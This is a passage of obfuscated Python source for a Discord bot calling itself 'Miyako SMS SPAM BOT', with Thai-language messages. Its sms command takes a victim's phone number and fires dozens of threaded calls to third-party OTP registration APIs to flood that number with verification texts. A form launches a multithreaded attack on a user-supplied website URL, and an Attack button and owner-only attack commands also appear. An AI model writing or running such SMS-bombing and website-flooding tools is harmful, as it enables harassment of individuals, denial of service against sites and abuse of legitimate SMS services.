	post (f"https://bkk-api.ks-it.co/Vcode/register?country_code=66&phone={O000OOOO0000OO0OO}&sms_type=1&user_type=2&app_version=4.3.25&device_id=79722530562d973f&app_device_param=%7B%22os%22%3A%22Android%22%2C%22app_version%22%3A%224.3.25%22%2C%22model%22%3A%22A37f%22%2C%22os_ver%22%3A%225.1.1%22%2C%22ble%22%3A%220%22%7D&language=th&token=")#line:349:post(f"https://bkk-api.ks-it.co/Vcode/register?country_code=66&phone={phone}&sms_type=1&user_type=2&app_version=4.3.25&device_id=79722530562d973f&app_device_param=%7B%22os%22%3A%22Android%22%2C%22app_version%22%3A%224.3.25%22%2C%22model%22%3A%22A37f%22%2C%22os_ver%22%3A%225.1.1%22%2C%22ble%22%3A%220%22%7D&language=th&token=")
def startall (OOOOOOOOO000000O0 ,O0000OO00OO0OOOOO ):#line:351:def startall(phone, amount):
    for _O00000O0O0OOOO000 in range (O0000OO00OO0OOOOO ):#line:352:for _ in range(amount):
        threading .submit (sk1 ,OOOOOOOOO000000O0 )#line:353:threading.submit(sk1, phone)
        threading .submit (sk2 ,OOOOOOOOO000000O0 )#line:354:threading.submit(sk2, phone)
        threading .submit (sk3 ,OOOOOOOOO000000O0 )#line:355:threading.submit(sk3, phone)
        threading .submit (sk4 ,OOOOOOOOO000000O0 )#line:356:threading.submit(sk4, phone)
        threading .submit (sk5 ,OOOOOOOOO000000O0 )#line:357:threading.submit(sk5, phone)
        threading .submit (ab1 ,OOOOOOOOO000000O0 )#line:358:threading.submit(ab1, phone)
        threading .submit (ab2 ,OOOOOOOOO000000O0 )#line:359:threading.submit(ab2, phone)
        threading .submit (ab3 ,OOOOOOOOO000000O0 )#line:360:threading.submit(ab3, phone)
        threading .submit (ab4 ,OOOOOOOOO000000O0 )#line:361:threading.submit(ab4, phone)
        threading .submit (ab5 ,OOOOOOOOO000000O0 )#line:362:threading.submit(ab5, phone)
        threading .submit (ab6 ,OOOOOOOOO000000O0 )#line:363:threading.submit(ab6, phone)
        threading .submit (ab7 ,OOOOOOOOO000000O0 )#line:364:threading.submit(ab7, phone)
        threading .submit (ab8 ,OOOOOOOOO000000O0 )#line:365:threading.submit(ab8, phone)
        threading .submit (ab9 ,OOOOOOOOO000000O0 )#line:366:threading.submit(ab9, phone)
        threading .submit (ab10 ,OOOOOOOOO000000O0 )#line:367:threading.submit(ab10, phone)
        threading .submit (ab11 ,OOOOOOOOO000000O0 )#line:368:threading.submit(ab11, phone)
        threading .submit (ab12 ,OOOOOOOOO000000O0 )#line:369:threading.submit(ab12, phone)
        threading .submit (ab13 ,OOOOOOOOO000000O0 )#line:370:threading.submit(ab13, phone)
        threading .submit (ab14 ,OOOOOOOOO000000O0 )#line:371:threading.submit(ab14, phone)
        threading .submit (ab15 ,OOOOOOOOO000000O0 )#line:372:threading.submit(ab15, phone)
        threading .submit (ab16 ,OOOOOOOOO000000O0 )#line:373:threading.submit(ab16, phone)
        threading .submit (ab17 ,OOOOOOOOO000000O0 )#line:374:threading.submit(ab17, phone)
        threading .submit (ab18 ,OOOOOOOOO000000O0 )#line:375:threading.submit(ab18, phone)
        threading .submit (ab19 ,OOOOOOOOO000000O0 )#line:376:threading.submit(ab19, phone)
        threading .submit (ab20 ,OOOOOOOOO000000O0 )#line:377:threading.submit(ab20, phone)
        threading .submit (ab21 ,OOOOOOOOO000000O0 )#line:378:threading.submit(ab21, phone)
        threading .submit (ab22 ,OOOOOOOOO000000O0 )#line:379:threading.submit(ab22, phone)
        threading .submit (ab23 ,OOOOOOOOO000000O0 )#line:380:threading.submit(ab23, phone)
        threading .submit (ab24 ,OOOOOOOOO000000O0 )#line:381:threading.submit(ab24, phone)
        threading .submit (ab25 ,OOOOOOOOO000000O0 )#line:382:threading.submit(ab25, phone)
        threading .submit (ab26 ,OOOOOOOOO000000O0 )#line:383:threading.submit(ab26, phone)
        threading .submit (ab27 ,OOOOOOOOO000000O0 )#line:384:threading.submit(ab27, phone)
        threading .submit (ab28 ,OOOOOOOOO000000O0 )#line:385:threading.submit(ab28, phone)
        threading .submit (ab29 ,OOOOOOOOO000000O0 )#line:386:threading.submit(ab29, phone)
        threading .submit (ab30 ,OOOOOOOOO000000O0 )#line:387:threading.submit(ab30, phone)
        threading .submit (ab31 ,OOOOOOOOO000000O0 )#line:388:threading.submit(ab31, phone)
        threading .submit (ab32 ,OOOOOOOOO000000O0 )#line:389:threading.submit(ab32, phone)
        threading .submit (ab33 ,OOOOOOOOO000000O0 )#line:390:threading.submit(ab33, phone)
        threading .submit (ab34 ,OOOOOOOOO000000O0 )#line:391:threading.submit(ab34, phone)
        threading .submit (ab35 ,OOOOOOOOO000000O0 )#line:392:threading.submit(ab35, phone)
        threading .submit (ab36 ,OOOOOOOOO000000O0 )#line:393:threading.submit(ab36, phone)
        threading .submit (ab37 ,OOOOOOOOO000000O0 )#line:394:threading.submit(ab37, phone)
        threading .submit (ab38 ,OOOOOOOOO000000O0 )#line:395:threading.submit(ab38, phone)
        threading .submit (ab39 ,OOOOOOOOO000000O0 )#line:396:threading.submit(ab39, phone)
        threading .submit (ab40 ,OOOOOOOOO000000O0 )#line:397:threading.submit(ab40, phone)
        threading .submit (ab41 ,OOOOOOOOO000000O0 )#line:398:threading.submit(ab41, phone)
        threading .submit (ab42 ,OOOOOOOOO000000O0 )#line:399:threading.submit(ab42, phone)
        threading .submit (ab43 ,OOOOOOOOO000000O0 )#line:400:threading.submit(ab43, phone)
        threading .submit (ab44 ,OOOOOOOOO000000O0 )#line:401:threading.submit(ab44, phone)
        threading .submit (ab45 ,OOOOOOOOO000000O0 )#line:402:threading.submit(ab45, phone)
        threading .submit (ab46 ,OOOOOOOOO000000O0 )#line:403:threading.submit(ab46, phone)
        threading .submit (ab47 ,OOOOOOOOO000000O0 )#line:404:threading.submit(ab47, phone)
        threading .submit (ab48 ,OOOOOOOOO000000O0 )#line:405:threading.submit(ab48, phone)
        threading .submit (ab49 ,OOOOOOOOO000000O0 )#line:406:threading.submit(ab49, phone)
        threading .submit (ab50 ,OOOOOOOOO000000O0 )#line:407:threading.submit(ab50, phone)
        threading .submit (ab51 ,OOOOOOOOO000000O0 )#line:408:threading.submit(ab51, phone)
        threading .submit (ab52 ,OOOOOOOOO000000O0 )#line:409:threading.submit(ab52, phone)
@bot .command ()#line:413:@bot.command()
async def help (OOO0O0OOOOOO0OOO0 ):#line:414:async def help(ctx):
    await OOO0O0OOOOOO0OOO0 .send (f"<a:success:1192084671060791308> | BOT STATUS ONLINE\n__**แจ้งเตือน**__ : ข้อความจะถูกลบภายใน15วิ",delete_after =15 )#line:415:await ctx.send(f"<a:success:1192084671060791308> | BOT STATUS ONLINE\n__**แจ้งเตือน**__ : ข้อความจะถูกลบภายใน15วิ",delete_after=15)
    await OOO0O0OOOOOO0OOO0 .send (f"```Command \n {PREFIX}help \n {PREFIX}sms คำสั่งยิงเบอร์ : {PREFIX}sms (เบอร์) (เวลา1- {str(LIMIT)}นาที) \n {PREFIX}{COMMAND_UPTIME} \n {PREFIX}{COMMAND_CHECK} ```\n __**OWNER COMMAND**__ \n ``` {PREFIX}{COMMAND_NSFW} [OWNER ONLY] \n {PREFIX}{COMMAND_VERIFY} [OWNER ONLY] \n {PREFIX}{COMMAND_SAVROLE} [OWNER ONLY] \n {PREFIX}{COMMAND_WEBHOOK} [ADMIN] \n {PREFIX}{COMMAND_REDEEM} [OWNER] \n {PREFIX}{COMMAND_ATTACK} [OWNER] \n {PREFIX}{COMMAND_SCRIPT}```",delete_after =15 )#line:416:await ctx.send(f"```Command \n {PREFIX}help \n {PREFIX}sms คำสั่งยิงเบอร์ : {PREFIX}sms (เบอร์) (เวลา1- {str(LIMIT)}นาที) \n {PREFIX}{COMMAND_UPTIME} \n {PREFIX}{COMMAND_CHECK} ```\n __**OWNER COMMAND**__ \n ``` {PREFIX}{COMMAND_NSFW} [OWNER ONLY] \n {PREFIX}{COMMAND_VERIFY} [OWNER ONLY] \n {PREFIX}{COMMAND_SAVROLE} [OWNER ONLY] \n {PREFIX}{COMMAND_WEBHOOK} [ADMIN] \n {PREFIX}{COMMAND_REDEEM} [OWNER] \n {PREFIX}{COMMAND_ATTACK} [OWNER] \n {PREFIX}{COMMAND_SCRIPT}```",delete_after=15)
    await OOO0O0OOOOOO0OOO0 .message .delete ()#line:417:await ctx.message.delete()
@bot .command ()#line:419:@bot.command()
async def sms (OO0OOOOO0O0OOO000 ,OOO0000OOOOOOO0OO =None ,OOOOOO000O00O0O0O =None ):#line:420:async def sms(ctx, phone=None, amount=None):
        if (OOO0000OOOOOOO0OO ==None or OOOOOO000O00O0O0O ==None ):#line:421:if (phone == None or amount == None):
            O00OOO00OOOO0O0O0 =discord .Embed (description =f"❌ | กรุณาใส่ข้อมูลให้ครบ",color =0xfa0202 ,timestamp =datetime .utcnow ())#line:422:embed=discord.Embed( description=f"❌ | กรุณาใส่ข้อมูลให้ครบ", color=0xfa0202,timestamp=datetime.utcnow())
            O00OOO00OOOO0O0O0 .set_thumbnail (url ='https://media.discordapp.net/attachments/680449178626818065/909437371097972747/794404253744496642.gif')#line:423:embed.set_thumbnail(url='https://media.discordapp.net/attachments/680449178626818065/909437371097972747/794404253744496642.gif')
            await OO0OOOOO0O0OOO000 .message .add_reaction ("❌")#line:424:await ctx.message.add_reaction("❌")
            await OO0OOOOO0O0OOO000 .send (embed =O00OOO00OOOO0O0O0 ,)#line:425:await ctx.send(embed=embed,)
        else :#line:426:else:
            if (OOO0000OOOOOOO0OO not in blacklist ):#line:427:if (phone not in blacklist):
                try :#line:428:try:
                    OOOOOO000O00O0O0O =int (OOOOOO000O00O0O0O )#line:429:amount = int(amount)
                    if (OOOOOO000O00O0O0O >LIMIT ):#line:430:if (amount > LIMIT):
                        O00OOO00OOOO0O0O0 =discord .Embed (description =f" ❌ | ใส่ไม่เกิน {OOOOOO000O00O0O0O} นาที.",color =0xfa0202 ,timestamp =datetime .utcnow ())#line:431:embed=discord.Embed(description=f" ❌ | ใส่ไม่เกิน {amount} นาที.", color=0xfa0202,timestamp=datetime.utcnow())
                        O00OOO00OOOO0O0O0 .set_thumbnail (url ='https://media.giphy.com/media/JT7Td5xRqkvHQvTdEu/giphy.gif')#line:432:embed.set_thumbnail(url='https://media.giphy.com/media/JT7Td5xRqkvHQvTdEu/giphy.gif')
                        await OO0OOOOO0O0OOO000 .message .add_reaction ("❌")#line:433:await ctx.message.add_reaction("❌")
                        await OO0OOOOO0O0OOO000 .send (embed =O00OOO00OOOO0O0O0 ,)#line:434:await ctx.send(embed=embed,)
                        await OO0OOOOO0O0OOO000 .message .delete ()#line:435:await ctx.message.delete()
                    else :#line:436:else:
                        O00OOO00OOOO0O0O0 =discord .Embed (description =f"เบอร์ 📱 | ||{OOO0000OOOOOOO0OO}|| \nสถานะ 📦  | สุ่ม API \nเป็นเวลา 📊 | {OOOOOO000O00O0O0O}/{LIMIT} นาที",color =0x02fafa )#line:439:embed=discord.Embed( description=f"เบอร์ 📱 | ||{phone}|| \nสถานะ 📦  | สุ่ม API \nเป็นเวลา 📊 | {amount}/{LIMIT} นาที", color=0x02fafa)
                        O00OOO00OOOO0O0O0 .set_footer (text =f"{OO0OOOOO0O0OOO000.message.author.name} คนยิง ")#line:440:embed.set_footer(text=f"{ctx.message.author.name} คนยิง " )
                        O00OOO00OOOO0O0O0 .set_author (name ='Miyako SMS SPAM BOT')#line:441:embed.set_author(name='Miyako SMS SPAM BOT')
                        OO0O0O00000O00OO0 =Images #line:442:ima = Images
                        O00OOO00OOOO0O0O0 .set_image (url =OO0O0O00000O00OO0 )#line:443:embed.set_image(url=ima)
                        await OO0OOOOO0O0OOO000 .reply (embed =O00OOO00OOOO0O0O0 )#line:444:await ctx.reply(embed=embed)
                        await OO0OOOOO0O0OOO000 .message .add_reaction ("✅")#line:445:await ctx.message.add_reaction("✅")
                        startall (OOO0000OOOOOOO0OO ,OOOOOO000O00O0O0O )#line:446:startall(phone, amount)
                except :#line:448:except:
                    O00OOO00OOOO0O0O0 =discord .Embed (description =f"❌ | ใส่เบอร์ให้ถูก. ",color =0xfa0202 ,timestamp =datetime .utcnow ())#line:449:embed=discord.Embed(description=f"❌ | ใส่เบอร์ให้ถูก. ", color=0xfa0202,timestamp=datetime.utcnow())
                    O00OOO00OOOO0O0O0 .set_thumbnail (url ='https://media.giphy.com/media/JT7Td5xRqkvHQvTdEu/giphy.gif')#line:450:embed.set_thumbnail(url='https://media.giphy.com/media/JT7Td5xRqkvHQvTdEu/giphy.gif')
                    await OO0OOOOO0O0OOO000 .message .add_reaction ("❌")#line:451:await ctx.message.add_reaction("❌")
                    await OO0OOOOO0O0OOO000 .message .delete ()#line:452:await ctx.message.delete()
                    await OO0OOOOO0O0OOO000 .send (embed =O00OOO00OOOO0O0O0 ,delete_after =10 )#line:453:await ctx.send(embed=embed,delete_after=10)
            else :#line:454:else:
                O00OOO00OOOO0O0O0 =discord .Embed (description =f"❌ | เบอร์นี้ไม่สามารถยิงได้ | ❌\n**{OO0OOOOO0O0OOO000.author}** ",color =0xfa0202 ,timestamp =datetime .utcnow ())#line:455:embed=discord.Embed( description=f"❌ | เบอร์นี้ไม่สามารถยิงได้ | ❌\n**{ctx.author}** ",color=0xfa0202,timestamp=datetime.utcnow())
                await OO0OOOOO0O0OOO000 .message .add_reaction ("❌")#line:456:await ctx.message.add_reaction("❌")
                await OO0OOOOO0O0OOO000 .send (embed =O00OOO00OOOO0O0O0 ,)#line:457:await ctx.send(embed=embed,)
                await OO0OOOOO0O0OOO000 .message .delete ()#line:458:await ctx.message.delete()
@bot .command ()#line:461:@bot.command()
async def saverole_setup (OOO00O000O000O000 :Interaction ):#line:462:async def saverole_setup(ctx: Interaction):
    if OOO00O000O000O000 .author .name ==name :#line:463:if ctx.author.name == name:
        await OOO00O000O000O000 .message .delete ()#line:464:await ctx.message.delete()
        O00OO0000OOO0000O =Embed (title ="บอทเซฟยศอัตโนมัติ",description ="```[+] ระบบนี้เป็นการป้องกันออกจากดิส\n[+] เมื่อทำการเซฟแล้วยศทั้งหมดจะบันทึกไว้ในระบบ\n[+] เซิฟยศเอาไว้เผื่อเด้งออกจากดิส\n > เซฟยศ (เซฟไว้ในระบบ)\n > รับยศคืน (ได้ยศคืนตามที่เซฟไว้)```\n",color =0xdddddd )#line:467:color=0xdddddd)
        O00OO0000OOO0000O .set_image (url =Images )#line:468:embed.set_image(url=Images)
        await OOO00O000O000O000 .send (embed =O00OO0000OOO0000O ,view =saverole (log_channel_id ))#line:469:await ctx.send(embed=embed, view=saverole(log_channel_id))
from datetime import datetime ,timedelta #line:471:from datetime import datetime, timedelta
class saverole (View ):#line:473:class saverole(View):
    def __init__ (O00OOO000000000O0 ,OOOOOOO00O00OOO00 ):#line:474:def __init__(self, log_channel_id):
        super ().__init__ (timeout =None )#line:475:super().__init__(timeout=None)
        O00OOO000000000O0 .log_channel_id =OOOOOOO00O00OOO00 #line:476:self.log_channel_id = log_channel_id
        O00OOO000000000O0 .cooldowns ={}#line:477:self.cooldowns = {}
    @nextcord .ui .button (label ="เซฟยศ",style =ButtonStyle .primary ,emoji ="<a:1198633069742141623:1198633069742141623>")#line:479:@nextcord.ui.button(label="เซฟยศ", style=ButtonStyle.primary, emoji="<a:1198633069742141623:1198633069742141623>")
    async def save (OOO00O000000O0OO0 ,O0000O0O0OOO0O00O :nextcord .Button ,O00O0O0000O0OOOOO :Interaction ):#line:480:async def save(self, button: nextcord.Button, interaction: Interaction):
        O0OOO0OOO00OOO0O0 =O00O0O0000O0OOOOO .user #line:481:user = interaction.user
        if O0OOO0OOO00OOO0O0 .id in OOO00O000000O0OO0 .cooldowns and O0OOO0OOO00OOO0O0 .id !=owner_id :#line:482:if user.id in self.cooldowns and user.id != owner_id:
            O00O0O0000O0000OO =OOO00O000000O0OO0 .cooldowns [O0OOO0OOO00OOO0O0 .id ]-datetime .now ()#line:483:time_remaining = self.cooldowns[user.id] - datetime.now()
            if O00O0O0000O0000OO .total_seconds ()>0 :#line:484:if time_remaining.total_seconds() > 0:
                await O00O0O0000O0OOOOO .response .send_message (f"> `รอ {int(O00O0O0000O0000OO.total_seconds() // 3600)} ชั่วโมง {int((O00O0O0000O0000OO.total_seconds() % 3600) // 60)} นาที เพื่อกดเซฟอีกครั้ง ` ❗",ephemeral =True )#line:485:await interaction.response.send_message(f"> `รอ {int(time_remaining.total_seconds() // 3600)} ชั่วโมง {int((time_remaining.total_seconds() % 3600) // 60)} นาที เพื่อกดเซฟอีกครั้ง ` ❗", ephemeral=True)
                return #line:486:return
        O00O000OO000OOO00 =[O00OOO0OOO00OOO00 .name for O00OOO0OOO00OOO00 in O0OOO0OOO00OOO0O0 .roles if "@everyone"not in O00OOO0OOO00OOO00 .name ]#line:488:role_data = [role.name for role in user.roles if "@everyone" not in role.name]
        OO0OOO0OO00OO0O0O =f"data/role_{O0OOO0OOO00OOO0O0.name}.json"#line:489:file_path = f"data/role_{user.name}.json"
        with open (OO0OOO0OO00OO0O0O ,"w")as O00OO0O00000O00OO :#line:490:with open(file_path, "w") as f:
            json .dump (O00O000OO000OOO00 ,O00OO0O00000O00OO )#line:491:json.dump(role_data, f)
        OOO00O000000O0OO0 .cooldowns [O0OOO0OOO00OOO0O0 .id ]=datetime .now ()+timedelta (days =1 )#line:493:self.cooldowns[user.id] = datetime.now() + timedelta(days=1)
        O0O0OO00O00O0O0O0 =Embed (title ="บันทึกยศที่เซฟ",color =0xdddddd )#line:495:embed = Embed(title="บันทึกยศที่เซฟ", color=0xdddddd)
        OOOO000OOO0OO0OO0 ="\n".join (O00O000OO000OOO00 )#line:496:formatted_roles = "\n".join(role_data)
        O0O0OO00O00O0O0O0 .add_field (name ="ยศที่เซฟ",value =f"```\n{OOOO000OOO0OO0OO0}```",inline =False )#line:497:embed.add_field(name="ยศที่เซฟ", value=f"```\n{formatted_roles}```", inline=False)
        OOO0OOOO0000OO0OO =datetime .now ().strftime ("%d/%m/%y")#line:498:current_time = datetime.now().strftime("%d/%m/%y")
        await O00O0O0000O0OOOOO .send (embed =O0O0OO00O00O0O0O0 ,ephemeral =True )#line:499:await interaction.send(embed=embed, ephemeral=True)
        O00OOO0OOOO000000 =bot .get_channel (OOO00O000000O0OO0 .log_channel_id )#line:501:log_channel = bot.get_channel(self.log_channel_id)
        if O00OOO0OOOO000000 :#line:502:if log_channel:
            OO00O00OO00OOO0OO =Embed (title ="บันทึกเรียบร้อย 📝",color =0xdddddd )#line:503:log_embed = Embed(title="บันทึกเรียบร้อย 📝", color=0xdddddd)
            OO00O00OO00OOO0OO .add_field (name ="ยศที่เซฟ",value =f"```\n{OOOO000OOO0OO0OO0}```",inline =False )#line:504:log_embed.add_field(name="ยศที่เซฟ", value=f"```\n{formatted_roles}```", inline=False)
            OO00O00OO00OOO0OO .add_field (name ="วันที่เซฟ",value =OOO0OOOO0000OO0OO ,inline =False )#line:505:log_embed.add_field(name="วันที่เซฟ", value=current_time, inline=False)
            O000O00OOO0OO0OOO =f"📝 {O0OOO0OOO00OOO0O0.name} ได้ทำการบันทึกยศเรียบร้อยแล้ว"#line:506:log_message = f"📝 {user.name} ได้ทำการบันทึกยศเรียบร้อยแล้ว"
            OO00O00OO00OOO0OO .set_footer (text =O000O00OOO0OO0OOO )#line:507:log_embed.set_footer(text=log_message)
            if O0OOO0OOO00OOO0O0 .avatar :#line:508:if user.avatar:
                    OO00O00OO00OOO0OO .set_author (name =f"{O0OOO0OOO00OOO0O0.name} ทำการบันทึกยศเรียบร้อยแล้ว",icon_url =O0OOO0OOO00OOO0O0 .avatar .url )#line:509:log_embed.set_author(name=f"{user.name} ทำการบันทึกยศเรียบร้อยแล้ว", icon_url=user.avatar.url)
            else :#line:510:else:
                OO00O00OO00OOO0OO .set_author (name =f"{O0OOO0OOO00OOO0O0.name} ทำการบันทึกยศเรียบร้อยแล้ว",icon_url =None )#line:511:log_embed.set_author(name=f"{user.name} ทำการบันทึกยศเรียบร้อยแล้ว", icon_url=None)
            await O00OOO0OOOO000000 .send (embed =OO00O00OO00OOO0OO )#line:513:await log_channel.send(embed=log_embed)
    @nextcord .ui .button (label ="รับยศคืน",style =ButtonStyle .green ,emoji ="<a:1198632831488897107:1198632831488897107>")#line:515:@nextcord.ui.button(label="รับยศคืน", style=ButtonStyle.green, emoji="<a:1198632831488897107:1198632831488897107>")
    async def get (OOOOO0OOOOOO0O00O ,OOOO000O00O0O0OOO :nextcord .Button ,OO0O00OOO0O0O00O0 :Interaction ):#line:516:async def get(self, button: nextcord.Button, interaction: Interaction):
        OOO000O0OOO00O000 =OO0O00OOO0O0O00O0 .user #line:517:user = interaction.user
        OOOO00000OO000000 =f"data/role_{OOO000O0OOO00O000.name}.json"#line:518:file_path = f"data/role_{user.name}.json"
        try :#line:519:try:
            with open (OOOO00000OO000000 ,"r")as O00O000O0OO0OO00O :#line:520:with open(file_path, "r") as f:
                OO00OOO00000000OO =json .load (O00O000O0OO0OO00O )#line:521:role_data = json.load(f)
                for O000OO0OOO00OO0O0 in OO00OOO00000000OO :#line:522:for role_name in role_data:
                    O0OO00OO0OOOOO0O0 =nextcord .utils .get (OO0O00OOO0O0O00O0 .guild .roles ,name =O000OO0OOO00OO0O0 )#line:523:roles = nextcord.utils.get(interaction.guild.roles, name=role_name)
                    await OOO000O0OOO00O000 .add_roles (O0OO00OO0OOOOO0O0 )#line:524:await user.add_roles(roles)
            await OO0O00OOO0O0O00O0 .send ("> `คืนยศให้คุณเรียบร้อยแล้ว`",ephemeral =True )#line:525:await interaction.send("> `คืนยศให้คุณเรียบร้อยแล้ว`", ephemeral=True)
        except FileNotFoundError :#line:526:except FileNotFoundError:
            await OO0O00OOO0O0O00O0 .send ("> `คุณยังไม่ได้เซฟยศรึปล่าว`",ephemeral =True )#line:527:await interaction.send("> `คุณยังไม่ได้เซฟยศรึปล่าว`", ephemeral=True)
    @nextcord .ui .button (label ="ดูข้อมูลผู้ใช้",style =ButtonStyle .blurple ,emoji ="<a:1198631834087592011:1198631834087592011>")#line:529:@nextcord.ui.button(label="ดูข้อมูลผู้ใช้", style=ButtonStyle.blurple, emoji="<a:1198631834087592011:1198631834087592011>")
    async def get_user_info (OOOO0OO000O0OO0O0 ,O000O0OOO0OOO000O :nextcord .Button ,O00000O00OOOOO0O0 :nextcord .Interaction ):#line:530:async def get_user_info(self, button: nextcord.Button, interaction: nextcord.Interaction):
        OO0OOOOOO0O0O0OOO =O00000O00OOOOO0O0 .user #line:531:user = interaction.user
        OOOOO000OO0O0OOOO =(O00000O00OOOOO0O0 .message .created_at -OO0OOOOOO0O0O0OOO .created_at ).days #line:533:created_since = (interaction.message.created_at - user.created_at).days
        OO00O0OOOOOOO00OO =f"{OOOOO000OO0O0OOOO} วันที่ผ่านมา"#line:534:created_since_str = f"{created_since} วันที่ผ่านมา"
        O000O0OO0O0OOO0OO =nextcord .Embed (title =f"ข้อมูลของ {OO0OOOOOO0O0O0OOO.display_name}",color =nextcord .Color .blurple ())#line:536:user_info_embed = nextcord.Embed(title=f"ข้อมูลของ {user.display_name}", color=nextcord.Color.blurple())
        if OO0OOOOOO0O0O0OOO .avatar :#line:538:if user.avatar:
            O000O0OO0O0OOO0OO .set_thumbnail (url =OO0OOOOOO0O0O0OOO .avatar .url )#line:539:user_info_embed.set_thumbnail(url=user.avatar.url)
        else :#line:540:else:
            O000O0OO0O0OOO0OO .set_thumbnail (url ="https://cdn.discordapp.com/attachments/889976848581287946/1193140899987865600/Herrscher.of.the.Void.full.2866346.gif?ex=65aba20e&is=65992d0e&hm=9afd68f45f0972ffadbaf18375adb52cf6e80cf59d83bbf6c0ecf1ca6e51a1e9&")#line:541:user_info_embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/889976848581287946/1193140899987865600/Herrscher.of.the.Void.full.2866346.gif?ex=65aba20e&is=65992d0e&hm=9afd68f45f0972ffadbaf18375adb52cf6e80cf59d83bbf6c0ecf1ca6e51a1e9&")
        O000O0OO0O0OOO0OO .add_field (name ="ID Discord",value =OO0OOOOOO0O0O0OOO .id ,inline =False )#line:543:user_info_embed.add_field(name="ID Discord", value=user.id, inline=False)
        O000O0OO0O0OOO0OO .add_field (name ="วันที่สร้างบัญชี",value =OO00O0OOOOOOO00OO ,inline =False )#line:544:user_info_embed.add_field(name="วันที่สร้างบัญชี", value=created_since_str, inline=False)
        if len (OO0OOOOOO0O0O0OOO .roles )>1 :#line:546:if len(user.roles) > 1:
            O0O0OO0OOOOO0O0O0 =", ".join ([OO0O0OO000O000O00 .mention for OO0O0OO000O000O00 in OO0OOOOOO0O0O0OOO .roles [1 :]])#line:547:roles = ", ".join([role.mention for role in user.roles[1:]])
            O000O0OO0O0OOO0OO .add_field (name ="บทบาท",value =O0O0OO0OOOOO0O0O0 ,inline =False )#line:548:user_info_embed.add_field(name="บทบาท", value=roles, inline=False)
        if OO0OOOOOO0O0O0OOO .premium_since :#line:550:if user.premium_since:
            O000O0OO0O0OOO0OO .add_field (name ="Nitro Boost",value ="เป็น Nitro Boost ตั้งแต่: "+OO0OOOOOO0O0O0OOO .premium_since .strftime ("%Y-%m-%d"),inline =False )#line:551:user_info_embed.add_field(name="Nitro Boost", value="เป็น Nitro Boost ตั้งแต่: " + user.premium_since.strftime("%Y-%m-%d"), inline=False)
        await O00000O00OOOOO0O0 .response .send_message (embed =O000O0OO0O0OOO0OO ,ephemeral =True )#line:554:await interaction.response.send_message(embed=user_info_embed, ephemeral=True)
    @nextcord .ui .button (label ="วิธีการใช้งาน",style =ButtonStyle .grey ,emoji ="<:4983blackcathuh:1198631074058752062>")#line:556:@nextcord.ui.button(label="วิธีการใช้งาน", style=ButtonStyle.grey, emoji="<:4983blackcathuh:1198631074058752062>")
    async def usage (O0OOOOOO000O00OO0 ,OO0O0000OOO0O0OOO :nextcord .Button ,OO00O0000OO000OOO :Interaction ):#line:557:async def usage(self, button: nextcord.Button, interaction: Interaction):
        OOO0O00OO0000000O ="```วิธีการใช้งาน:\n1. คลิกปุ่ม 'เซฟยศ' เพื่อบันทึกยศของคุณ\n2. หากต้องการคืนยศให้กับตัวเอง คลิกปุ่ม 'รับยศคืน'\n3. หากต้องการดูวิธีการใช้งานอื่นๆ คลิกปุ่ม 'วิธีการใช้งาน'\n\nหมายเหตุ : การกดเซฟยศมีคลูดาว 1\nวันกรณีดิสโดนยิงหรือคุณออกจากดิสยศคุณจะไม่หาย```"#line:558:instructions = "```วิธีการใช้งาน:\n1. คลิกปุ่ม 'เซฟยศ' เพื่อบันทึกยศของคุณ\n2. หากต้องการคืนยศให้กับตัวเอง คลิกปุ่ม 'รับยศคืน'\n3. หากต้องการดูวิธีการใช้งานอื่นๆ คลิกปุ่ม 'วิธีการใช้งาน'\n\nหมายเหตุ : การกดเซฟยศมีคลูดาว 1\nวันกรณีดิสโดนยิงหรือคุณออกจากดิสยศคุณจะไม่หาย```"
        O000O0O000O000OOO =Embed (title ="วิธีการใช้งานบอท",description =OOO0O00OO0000000O ,color =0xf8f5f5 )#line:560:embed = Embed(title="วิธีการใช้งานบอท", description=instructions, color=0xf8f5f5)
        O000O0O000O000OOO .set_footer (text ="Made by Miayko!")#line:561:embed.set_footer(text="Made by Miayko!")
        await OO00O0000OO000OOO .send (embed =O000O0O000O000OOO ,ephemeral =True )#line:563:await interaction.send(embed=embed, ephemeral=True)
class dssddsauhf (nextcord .ui .Modal ):#line:565:class dssddsauhf(nextcord.ui.Modal):
    def __init__ (OOOOO000O0O0O0OO0 ):#line:566:def __init__(self):
        super ().__init__ (title ='ยิงเว็บไซต์')#line:567:super().__init__(title='ยิงเว็บไซต์')
        OOOOO000O0O0O0OO0 .url =nextcord .ui .TextInput (label ='ลิงก์เว็บไซต์',required =True ,placeholder ='xxxxxxxxxxxxxxxxxxxxxxxxxxx')#line:568:self.url = nextcord.ui.TextInput(label='ลิงก์เว็บไซต์', required=True, placeholder='xxxxxxxxxxxxxxxxxxxxxxxxxxx')
        OOOOO000O0O0O0OO0 .add_item (OOOOO000O0O0O0OO0 .url )#line:569:self.add_item(self.url)
        OOOOO000O0O0O0OO0 .th =nextcord .ui .TextInput (label ='Threads (defaults 500)',required =True ,placeholder ='xxxxxxxxxxxxxxxxxxxxxxxxxxx')#line:570:self.th = nextcord.ui.TextInput(label='Threads (defaults 500)', required=True, placeholder='xxxxxxxxxxxxxxxxxxxxxxxxxxx')
        OOOOO000O0O0O0OO0 .add_item (OOOOO000O0O0O0OO0 .th )#line:571:self.add_item(self.th)
    async def callback (OOOOO0OOO0O00OOOO ,OOO0O0O00O0O00OO0 :nextcord .Interaction ):#line:573:async def callback(self, interaction: nextcord.Interaction):
        try :#line:574:try:
            O00OOO0O0O000000O =int (OOOOO0OOO0O00OOOO .th .value )#line:575:i = int(self.th.value)
        except ValueError :#line:576:except ValueError:
            O00OOO0O0O000000O =500 #line:577:i = 500
        await OOO0O0O00O0O00OO0 .response .send_message ('## > เริ่มโจมตีเว็บไซต์ของคุณแล้ว!',ephemeral =True )#line:578:await interaction.response.send_message('## > เริ่มโจมตีเว็บไซต์ของคุณแล้ว!', ephemeral=True)
        threading .Thread (target =run ,args =[OOOOO0OOO0O00OOOO .url .value ,O00OOO0O0O000000O ]).start ()#line:579:threading.Thread(target=run, args=[self.url.value, i]).start()
class attack (nextcord .ui .View ):#line:581:class attack(nextcord.ui.View):
    def __init__ (OOOO0OO0O00OO00O0 ):#line:582:def __init__(self):
        super ().__init__ (timeout =None )#line:583:super().__init__(timeout=None)
    @nextcord .ui .button (label ='Attack',style =nextcord .ButtonStyle .green )#line:588:)
